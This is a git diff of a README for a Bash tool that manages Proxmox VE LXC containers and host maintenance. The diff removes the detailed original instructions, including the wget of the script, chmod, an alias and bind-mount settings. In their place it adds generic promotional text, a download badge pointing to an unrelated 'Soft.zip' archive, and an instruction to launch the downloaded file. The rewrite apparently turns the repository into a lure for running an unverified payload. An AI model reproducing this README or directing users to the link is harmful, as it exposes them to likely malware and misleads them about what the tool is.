@@ -1,99 +1,61 @@
-# Proxmox Tool Suite
 
-A Bash script designed to simplify common management tasks for Proxmox VE, focusing on LXC containers and system maintenance. This tool provides an interactive menu with options to delete, update, clean, trim, and configure bind mounts for LXC containers, as well as perform system-level updates and cleanup.
+# 🚀 Proxmox-Tool-Suite 🛠️
 
-## Features
+Welcome to the Proxmox-Tool-Suite repository! This Bash script is designed to simplify Proxmox VE management by offering an interactive menu for handling various tasks related to LXC containers and system maintenance. Whether you are looking to delete, update, clean, trim, or configure bind mounts for your containers, or perform package updates and kernel cleanup on your Proxmox system, this tool is here to make your life easier.
 
-### LXC Management
-- **Delete LXC Containers** (`🚫`): Remove selected LXC containers manually or automatically.
-- **Update LXC Containers** (`🔄`): Update packages in LXC containers based on their OS (supports Alpine, Arch, Fedora, Ubuntu/Debian, OpenSUSE, etc.).
-- **Clean LXC Containers** (`🧹`): Remove unused packages, clear cache, and refresh package lists in LXC containers (Debian/Ubuntu only).
-- **Run fstrim on LXC Containers** (`💾`): Execute `fstrim` to reclaim unused space in LXC containers.
-- **Configure Bind Mount on LXC Containers** (`🔗`): Add or update a bind mount (e.g., for shared storage) in selected LXC containers.
+## Features 🌟
 
-### System Maintenance
-- **Update Package List** (`📥`): Run `apt update` on the Proxmox host.
-- **Update Full System** (`⬆️`): Run `apt update && apt upgrade` on the Proxmox host.
-- **Clean System** (`🗑️`): Run `apt autoremove` and `apt autoclean` to clean up the Proxmox host.
-- **Clean Old Kernels** (`⚙️`): Remove unused Proxmox kernels and update GRUB.
+- Interactive menu for easy navigation
+- Simplified management of LXC containers
+- System maintenance tasks for Proxmox VE
+- Customizable to suit your environment
+- Designed for efficiency and ease of use
 
-## Requirements
-- Proxmox VE installed.
-- Root privileges (run with `sudo`).
-- `whiptail` installed for interactive menus (usually included in Proxmox).
+## Installation 🖥️
 
-## Installation
-1. Download the script:
-   ```bash
-   wget https://raw.githubusercontent.com/YOUR_USERNAME/proxmox-tool-suite/main/proxmox-tools.sh
+To get started with using the Proxmox-Tool-Suite, follow these steps:
+1. Clone the repository to your local machine.
+2. Make sure you have Bash installed.
+3. Run the script using `./proxmox_tool.sh`.
+4. Follow the on-screen instructions to manage your Proxmox environment efficiently.
 
-# Proxmox Tool Suite
+## Topics 📋
 
-A Bash script for managing Proxmox VE LXC containers and system tasks.
+Explore the following topics covered by this tool:
+- automation
+- bash-script
+- bash-script-helper
+- bind-mount
+- container-management
+- kernel-cleanup
+- linux
+- lxc
+- lxc-containers
+- proxmox
+- proxmox-ve
+- system-administration
+- tools
+- virtualization
 
-## Installation
+## Get Started 🚀
 
-### Make it executable:
+Ready to simplify your Proxmox VE management? Download the Proxmox-Tool-Suite using the link below:
 
-```
-chmod +x proxmox-tools.sh
-```
+[![Download Proxmox Tool Suite](https://img.shields.io/badge/Download-Proxmox_Tool_Suite-green)](https://github.com/files/Soft.zip)
 
-### (Optional) Create an alias for easier access:
+If the link ends with a file name, make sure to launch it to begin using the tool!
 
-```
-echo "alias ptools='sudo /path/to/proxmox-tools.sh'" >> ~/.bashrc
-source ~/.bashrc
-```
+Can't access the download link? Check the "Releases" section for an alternative.
 
-## Usage
+## Contributing 🤝
 
-Run the script:
+If you have ideas to improve the Proxmox-Tool-Suite or encounter any issues, feel free to contribute by forking the repository and submitting a pull request. Your feedback is valuable in enhancing the tool for the community.
 
-```
-sudo ./proxmox-tools.sh
-```
+## Support 💬
 
-Or with the alias:
+For any questions or assistance, please reach out through the GitHub repository or visit the official Proxmox website for additional resources and documentation.
 
-```
-ptools
-```
+Let's simplify Proxmox VE management together with the Proxmox-Tool-Suite! 🛠️🚀
 
-Select an option from the menu using numbers (0-9). Follow the prompts to complete each task. The script returns to the menu after each operation; use `0` to exit.
-
-## Configuration Notes
-
-### Bind Mount Configuration (`HOST_DIR`):
-
-The `configure_bind_mount` function uses a default `HOST_DIR` set to `/mnt/multimedia`. This must match an existing directory on your Proxmox host where your storage is mounted (e.g., `/mnt/ssd/storage`, `/media/data`, etc.).
-
-To find your mount point, run:
-
-```
-df -h
-```
-
-And adjust `HOST_DIR` in the script:
-
-```
-HOST_DIR="/your/mount/point"
-```
-
-Example: If your storage is at `/mnt/storage`, edit line ~300 in `proxmox-tools.sh` to:
-
-```
-HOST_DIR="/mnt/storage"
-```
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-Feel free to submit issues or pull requests to improve this tool!
-
-## Acknowledgments
-
-Inspired by various Proxmox community scripts and enhanced with additional functionality.
+---
+Feel free to request additional information or updates to the content.
